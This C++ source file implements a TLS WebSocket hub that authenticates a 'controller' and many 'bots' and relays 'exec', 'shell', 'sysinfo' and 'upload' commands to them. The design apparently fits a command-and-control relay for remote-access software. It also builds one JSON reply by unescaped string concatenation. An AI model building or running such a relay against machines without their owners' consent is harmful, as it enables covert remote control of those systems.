#include "client_handler.h"
#include "hub.h"
#include "common/crypto_utils.h"
#include <spdlog/spdlog.h>
#include <boost/beast/websocket/ssl.hpp>
#include <openssl/err.h>

ClientHandler::ClientHandler(tcp::socket&& socket, net::ssl::context& ssl_ctx,
                             std::shared_ptr<Hub> hub,
                             const std::string& admin_hash,
                             const std::string& reg_hash)
    : ws_(std::move(socket), ssl_ctx), hub_(hub),
      admin_token_hash_(admin_hash), registration_token_hash_(reg_hash) {}

void ClientHandler::start() {
    ws_.async_accept([self = shared_from_this()](beast::error_code ec) {
        self->on_handshake(ec);
    });
}

void ClientHandler::on_handshake(beast::error_code ec) {
    if (ec) {
        unsigned long ssl_err = ERR_get_error();
        char buf[256];
        ERR_error_string_n(ssl_err, buf, sizeof(buf));
        spdlog::error("Handshake failed: {} (OpenSSL: {})", ec.message(), buf);
        return;
    }
    spdlog::info("WebSocket connection accepted");
    do_read();
}

void ClientHandler::do_read() {
    ws_.async_read(buffer_,
        [self = shared_from_this()](beast::error_code ec, std::size_t bytes) {
            self->on_read(ec, bytes);
        });
}

void ClientHandler::on_read(beast::error_code ec, std::size_t) {
    if (ec) {
        if (role_ == "bot" && !id_.empty()) hub_->unregister_bot(id_);
        if (role_ == "controller") hub_->set_controller(nullptr);
        return;
    }
    std::string msg = beast::buffers_to_string(buffer_.data());
    buffer_.consume(buffer_.size());
    handle_message(msg);
    do_read();
}

void ClientHandler::send(const std::string& message) {
    ws_.async_write(net::buffer(message),
        [self = shared_from_this()](beast::error_code ec, std::size_t) {
            if (ec) spdlog::error("Write failed: {}", ec.message());
        });
}

void ClientHandler::handle_message(const std::string& msg) {
    try {
        auto j = nlohmann::json::parse(msg);
        if (j.contains("type") && j["type"] == "auth") {
            authenticate(j);
        } else if (role_ == "controller") {
            process_controller_message(j);
        } else if (role_ == "bot") {
            // forward message to controller
            auto ctrl = hub_->get_controller();
            if (ctrl) {
                nlohmann::json fwd;
                fwd["type"] = "bot_response";
                fwd["bot_id"] = id_;
                fwd["payload"] = j;
                ctrl->send(fwd.dump());
            }
        } else {
            send("{\"error\":\"not authenticated\"}");
        }
    } catch (...) {
        send("{\"error\":\"invalid json\"}");
    }
}

void ClientHandler::authenticate(const nlohmann::json& j) {
    std::string token = j.value("token", "");
    std::string role = j.value("role", "");
    if (role == "controller") {
        if (verify_hash(token, admin_token_hash_)) {
            role_ = "controller";
            hub_->set_controller(shared_from_this());
            send("{\"type\":\"auth_ok\",\"role\":\"controller\"}");
            spdlog::info("Controller authenticated");
        } else {
            send("{\"type\":\"auth_fail\"}");
        }
    } else if (role == "bot") {
        if (verify_hash(token, registration_token_hash_)) {
            role_ = "bot";
            id_ = j.value("bot_id", "");
            if (id_.empty()) id_ = std::to_string(std::hash<std::string>{}(token));
            hub_->register_bot(id_, shared_from_this());
            send("{\"type\":\"auth_ok\",\"role\":\"bot\",\"bot_id\":\"" + id_ + "\"}");
            spdlog::info("Bot {} authenticated", id_);
        } else {
            send("{\"type\":\"auth_fail\"}");
        }
    }
}

void ClientHandler::process_controller_message(const nlohmann::json& j) {
    std::string type = j.value("type", "");
    if (type == "list") {
        auto bots = hub_->list_bots();
        nlohmann::json resp;
        resp["type"] = "list_response";
        resp["bots"] = bots;
        send(resp.dump());
    } else if (type == "exec" || type == "shell" || type == "sysinfo" || type == "upload") {
        std::string target = j.value("target", "");
        auto bot = hub_->get_bot(target);
        if (bot) {
            bot->send(j.dump());
        } else {
            send("{\"error\":\"bot not found\"}");
        }
    }
}